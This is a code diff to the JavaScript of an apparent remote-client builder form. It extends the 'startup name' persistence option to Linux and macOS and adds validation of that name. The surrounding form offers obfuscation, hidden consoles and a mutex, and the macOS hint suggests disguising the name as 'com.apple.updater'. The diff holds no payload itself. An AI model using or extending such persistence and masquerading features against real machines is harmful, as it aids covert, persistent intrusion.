@@ -219,6 +219,10 @@ const persistenceEmptyState = document.getElementById("persistence-empty-state")
 const persistenceWindowsSettings = document.getElementById("persistence-windows-settings");
 const persistenceLinuxSettings = document.getElementById("persistence-linux-settings");
 const persistenceMacSettings = document.getElementById("persistence-macos-settings");
+const persistenceStartupNameContainer = document.getElementById("persistence-startup-name-container");
+const startupNameMacosHint = document.getElementById("startup-name-macos-hint");
+const startupNameDefaultHint = document.getElementById("startup-name-default-hint");
+const startupNameError = document.getElementById("startup-name-error");
 const platformInputs = document.querySelectorAll('input[name="platform"]');
 
 function getSelectedPlatformFamilies() {
@@ -231,6 +235,20 @@ function getSelectedPlatformFamilies() {
     linux: selectedPlatforms.some((platform) => platform.startsWith("linux-")),
     darwin: selectedPlatforms.some((platform) => platform.startsWith("darwin-")),
   };
+}
+
+function validateStartupName() {
+  if (!startupNameError) return true;
+  const families = getSelectedPlatformFamilies();
+  const val = document.getElementById("startup-name")?.value.trim() || "";
+  if (families.darwin && val && !val.startsWith("com.")) {
+    startupNameError.textContent = "macOS requires the name to start with \"com.\" (e.g. com.apple.updater)";
+    startupNameError.classList.remove("hidden");
+    return false;
+  }
+  startupNameError.textContent = "";
+  startupNameError.classList.add("hidden");
+  return true;
 }
 
 function updatePersistenceSettingsVisibility() {
@@ -256,9 +274,19 @@ function updatePersistenceSettingsVisibility() {
   if (persistenceMacSettings) {
     persistenceMacSettings.classList.toggle("hidden", !families.darwin);
   }
+  if (persistenceStartupNameContainer) {
+    persistenceStartupNameContainer.classList.toggle("hidden", !hasSupportedFamily);
+  }
+  if (startupNameMacosHint) {
+    startupNameMacosHint.classList.toggle("hidden", !families.darwin);
+  }
+  if (startupNameDefaultHint) {
+    startupNameDefaultHint.classList.toggle("hidden", families.darwin);
+  }
   if (persistenceEmptyState) {
     persistenceEmptyState.classList.toggle("hidden", hasSupportedFamily);
   }
+  validateStartupName();
 }
 
 if (persistenceCheckbox && persistenceMethodContainer) {
@@ -269,6 +297,8 @@ platformInputs.forEach((input) => {
   input.addEventListener("change", updatePersistenceSettingsVisibility);
   input.addEventListener("change", updateWindowsSectionVisibility);
 });
+
+document.getElementById("startup-name")?.addEventListener("input", validateStartupName);
 
 updatePersistenceSettingsVisibility();
 
@@ -554,6 +584,11 @@ form?.addEventListener("submit", async (e) => {
     return;
   }
 
+  if (!validateStartupName()) {
+    document.getElementById("startup-name")?.focus();
+    return;
+  }
+
   const serverUrl = form.querySelector("#server-url").value.trim();
   const rawServerList = form.querySelector("#raw-server-list")?.checked || false;
   const mutex = form.querySelector("#mutex")?.value.trim() || "";
@@ -565,10 +600,11 @@ form?.addEventListener("submit", async (e) => {
     'input[name="enable-persistence"]',
   ).checked;
   const hasWindowsTarget = platforms.some((platform) => platform.startsWith("windows-"));
+  const hasPersistentUnixTarget = platforms.some((p) => p.startsWith("linux-") || p.startsWith("darwin-"));
   const persistenceMethods = hasWindowsTarget
     ? Array.from(form.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value)
     : undefined;
-  const startupNameVal = hasWindowsTarget
+  const startupNameVal = (hasWindowsTarget || hasPersistentUnixTarget)
     ? (form.querySelector("#startup-name")?.value.trim() || "")
     : "";
   const hideConsole = form.querySelector(
@@ -604,7 +640,7 @@ form?.addEventListener("submit", async (e) => {
     obfuscate,
     enablePersistence,
     persistenceMethods: enablePersistence && hasWindowsTarget ? (persistenceMethods && persistenceMethods.length > 0 ? persistenceMethods : ['startup']) : undefined,
-    startupName: enablePersistence && hasWindowsTarget && startupNameVal ? startupNameVal : undefined,
+    startupName: enablePersistence && (hasWindowsTarget || hasPersistentUnixTarget) && startupNameVal ? startupNameVal : undefined,
     hideConsole,
     noPrinting,
     outputName: outputNameVal || undefined,
